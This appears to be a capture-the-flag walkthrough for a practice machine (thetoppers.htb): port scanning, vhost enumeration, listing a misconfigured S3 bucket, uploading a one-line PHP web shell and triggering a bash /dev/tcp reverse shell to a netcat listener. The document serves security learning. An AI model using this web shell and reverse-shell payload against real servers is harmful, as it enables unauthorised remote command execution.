## 1. Questions
- Task 1
	- How many TCP ports are open?
		- `2`
- Task 2
	- What is the domain of the email address provided in the "Contact" section of the website?
		- `mail@thetoppers.htb`
- Task 3
	- In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
		- `etc/hosts`
- Task 4
	- Which sub-domain is discovered during further enumeration?
		- `s3.thetoppers.htb`
- Task 5
	- Which service is running on the discovered sub-domain?
		- `Amazon S3`
- Task 6
	- Which command line utility can be used to interact with the service running on the discovered sub-domain?
		- `awscli`
- Task 7
	- Which command is used to set up the AWS CLI installation?
		- `aws configure`
- Task 8
	- What is the command used by the above utility to list all of the S3 buckets?
		- `aws s3 ls`
- Task 9
	- This server is configured to run files written in what web scripting language?
		- `php`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- echo
- tee
- gobuster
- awscli
- netcat
- find
- cat
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.227.248
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-p-` - Scan all ports
	- `-T4` - Use speed template `aggressive`.
- Result
```
<snip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Test webserver response
- Useful resource
	- https://devhints.io/curl
#### curl
```bash
curl -i http://10.129.227.248
```
#### Browser 
![](../Assets/Screenshot%202025-08-20%20at%2013.35.53.png)
### Explore webpage content
- Most elements of no discernible value
- Key result element
![](../Assets/Screenshot%202025-08-20%20at%2013.36.11.png)
### Add static entry to /etc/host
- Useful resource
	- https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html
```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```
### Directory enumeration
- Useful resource
	- https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/
```bash
gobuster dir -u http://thetoppers.htb -w /opt/useful/seclists/Discovery/Web-Content/common.txt
```
No directories of discernible value returned
### Vhost enumeration
- Useful resource
	- https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/
```bash
gobuster vhost -u http://thetoppers.htb -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
- Results
```bash
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
```
### Add static entry to /etc/hosts - s3 vhost
```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```
### Configure awscli
- Useful resource
	- https://devhints.io/awscli
- Configured Values (based on being a lab environment)
	- `AWS Access Key ID [None]: temp`
	- `AWS Secret Access Key [None]: temp`
	- `Default region name [None]: temp`
	- `Default output format [None]: temp`
```bash
aws configure
```
### Explore S3 buckets
- Useful resource
	- https://devhints.io/awscli
	- https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-endpoints.html#:~:text=and%20settings%20precedence-,Set%20endpoint%20for%20a%20single%20command,-To%20override%20any
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
- Result
```bash
2025-09-14 14:04:03 thetoppers.htb
```
### Explore contents of bucket
- Useful resource
	- https://devhints.io/awscli
	- https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-endpoints.html#:~:text=and%20settings%20precedence-,Set%20endpoint%20for%20a%20single%20command,-To%20override%20any
```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
- Result
```bash
                           PRE images/
2025-09-14 14:04:03          0 .htaccess
2025-09-14 14:04:03      11952 index.php
```
### Test unrestricted file upload vulnerability
- Useful resource
	- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
	- https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d#:~:text=Crafting%20the%20Web%20Shell
#### Copy simple php webshell script to a file
```php
echo "<?php system(\$_REQUEST['cmd']); ?>" > shell.php
```
#### Try uploading the file 
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp ./shell.php s3://thetoppers.htb/
```
#### Check if file was uploaded
```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
- Result
```bash
                           PRE images/
2025-08-20 07:24:07          0 .htaccess
2025-08-20 07:24:07      11952 index.php
2025-08-20 09:54:21         31 shell.php
```
### Test RCE vulnerability
- Useful resource
	- https://www.f5.com/labs/learning-center/web-shells-understanding-attackers-tools-and-techniques
![](../Assets/Screenshot%202025-08-20%20at%2015.59.25.png)
### Connect a reverse shell
- Useful resources
	- https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d#:~:text=Crafting%20the%20Web%20Shell
	- https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d#:~:text=Start%20a%20Listener%20on%20Your%20Machine
	- https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d#:~:text=sh%2B%3CYOUR_IP%3E%2B4444-,Bash%20Reverse%20Shell,-%3A
#### Terminal: Start a netcat listener
```bash
nc -nvlp 4444
```
#### Browser: Send request
```bash
http://thetoppers.htb/shell.php?cmd=bash -c 'bash+-i+>%26+/dev/tcp/10.10.14.85/4444+0>%261'
```
- Result in the terminal
```bash
www-data@three:/var/www/html$ 
```
### Explore files and directories
- Flag found in  `/var/www` directory
### Retrieve the flag
```bash
cat /var/www/flag.txt
```
